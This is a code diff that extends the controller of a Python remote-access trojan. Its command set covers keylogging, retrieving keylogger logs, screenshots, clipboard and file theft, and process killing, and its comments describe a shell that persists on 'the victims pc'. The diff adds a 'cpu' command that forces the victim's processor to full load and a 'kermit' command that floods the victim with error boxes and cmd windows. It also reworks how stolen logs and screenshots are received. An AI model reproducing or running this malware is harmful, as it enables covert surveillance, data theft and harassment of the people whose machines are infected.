@@ -24,7 +24,7 @@ session_ids = []
 COMMANDS = ["help", "sessions"]
 SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs",
                     "keybind", "msg", "statlights", "delete", "uninstall", "ls", "whoami", "clipboard", "download",
-                    "error", "screenshot"]
+                    "error", "screenshot", "cpu", "kermit"]
 
 
 class Commands:
@@ -158,7 +158,7 @@ class Commands:
                 except ValueError:
                     print("The argument needs to be a number")
                 # gets the username of the computer
-                username = sendMessage("c o echo %USERNAME%").replace("\n", "")
+                username = sendMessage("c o echo %USERNAME%").strip()
                 # sends the matrix.bat script
                 with open("extraScripts/matrix.bat", "r") as file:
                     sendMessage(file.read())
@@ -197,10 +197,15 @@ class Commands:
         # gets the keylogger logs
         elif message == "getlogs":
             sendMessage("r C:/$SysStartup/temp/logs.txt")
-            exists = receiveMessage()
-            if exists != "err":
-                with open("downloadedLogs.txt", "a") as file:
-                    file.write(str(exists))
+            exists = conn.recv(2048)
+            if exists != b"err":
+                while exists:
+                    with open("downloadedLogs.txt", "ab") as file:
+                        file.write(exists)
+                    if exists != b"done":
+                        exists = conn.recv(2048)
+                    else:
+                        return
             else:
                 print("Either wait for a logfile or install the keylogger.")
         # deletes a file in given path
@@ -215,7 +220,7 @@ class Commands:
 
         # uninstalls the whole shell
         elif message == "uninstall":
-            user = sendMessage("c o echo %USERNAME%").replace("\n", "")
+            user = sendMessage("c o echo %USERNAME%").strip()
             with open("extraScripts/uninstall.bat", "r") as file:
                 sendMessage(file.read())
             name = receiveMessage()
@@ -279,7 +284,10 @@ class Commands:
         elif message == "ls":
             if args:
                 path = " ".join(args).replace("/", "\\")
-                print(sendMessage(f'c o dir "{path}"'))
+                if " " in path:
+                    print(sendMessage(f'c o dir "{path}"'))
+                else:
+                    print(sendMessage(f'c o dir {path}'))
 
             elif not args:
                 print("You need specify a path type 'help' for more")
@@ -324,13 +332,12 @@ class Commands:
                     t = int(args[0])
                 except ValueError:
                     print("you need to input a number type 'help' for more")
-                username = sendMessage("c o echo %USERNAME%").replace("\n", "")
+                username = sendMessage("c o echo %USERNAME%").strip()
                 with open("extraScripts/errorbox.vbs", "r") as file:
                     sendMessage(file.read())
                 name = receiveMessage()
-
+                halve = int(args[0]) / 2
                 for i in range(int(args[0])):
-                    print(name, username)
                     sendMessage(f'c n C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}')
 
             elif not args:
@@ -339,13 +346,13 @@ class Commands:
                 print("too many arguments type 'help' for more")
         # takes a screenshot
         elif message == "screenshot":
-            usersName = str(sendMessage("c o echo %USERNAME%").replace("\n", ""))
+            usersName = str(sendMessage("c o echo %USERNAME%").strip())
             with open("extraScripts/screen.py", "r") as file:
                 sendMessage(file.read())
             name = receiveMessage()
             sendMessage(f"c n python C:\\Users\\{usersName}\\AppData\\Local\\Temp\\{name}")
             # waits for file creation
-            sleep(1)
+            sleep(5)
             # request file
             sendMessage("r C:\\Users\\Public\\monitor-1.png")
             pic = conn.recv(2048)
@@ -358,8 +365,74 @@ class Commands:
                 else:
                     sendMessage("c n del /f /Q C:\\Users\\Public\\monitor-1.png")
                     return
+        # makes the cpu go to 100%
+        elif message == "cpu":
+            if len(args) == 1:
+                try:
+                    int(args[0])
+                except ValueError:
+                    print("You need to specify a number as secconds")
 
-         # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
+                # changes the timer in the cpu file
+                with open("extraScripts/cpu.py", "r") as file:
+                    string = file.read().replace("!edit", args[0])
+                    with open("extraScripts/cpu.py", "w") as edit:
+                        edit.write(string)
+                username = sendMessage("c o echo %USERNAME%").strip()
+
+                with open("extraScripts/cpu.py", "r") as send:
+                    sendMessage(send.read())
+                name = receiveMessage()
+                sendMessage(f"c n python C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}")
+
+                # resets the file
+                with open("extraScripts/cpu.py", "r") as file:
+                    string = file.read().replace(args[0], "!edit")
+                    with open("extraScripts/cpu.py", "w") as edit:
+                        edit.write(string)
+            elif not args:
+                print("You need to specify an argument type 'help' for more")
+            else:
+                print("Too many arguments type 'help' for more")
+        elif message == "kermit":
+            # gets the username for execution of the sendet scripts
+            username = sendMessage("c o echo %USERNAME%").strip()
+            sendMessage("b .gif")
+            name = receiveMessage()
+            sleep(0.5)
+            # sends the kermit gif
+            with open("extraScripts/kermit.gif", "rb") as file:
+                string = file.read(2048)
+                while string:
+                    conn.send(string)
+                    string = file.read(2048)
+                conn.send(b"done")
+            sleep(2)
+            path = f"C:/Users/{username}/AppData/Local/Temp/"
+            conn.send(path.encode())
+            # if everything went well the last 2 scripts will get sent
+            if receiveMessage() == "succ":
+                with open("extraScripts/kermiterr.vbs", "r") as err:
+                    sendMessage(err.read())
+                # gets the name of the vbs script
+                errname = receiveMessage()
+                with open("extraScripts/kermitcmd.bat", "r") as cmd:
+                    sendMessage(cmd.read())
+                # receives the nam of the cmd scripts
+                cmdname = receiveMessage()
+                # opens all the scrips
+                sendMessage(f"c n C:/Users/{username}/AppData/Local/Temp/{name}")
+                sleep(0.1)
+                sendMessage(f"c n C:/Users/{username}/AppData/Local/Temp/{name}")
+                sleep(0.2)
+                for boxes in range(0, 5):
+                    sendMessage(f"c n C:/Users/{username}/AppData/Local/Temp/{errname}")
+                sleep(0.2)
+                for cmds in range(0, 10):
+                    sendMessage(f"c n start cmd /c C:/Users/{username}/AppData/Local/Temp/{cmdname}")
+                    sleep(0.1)
+
+        # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
             sendMessage("!dsc")
             conn.close()
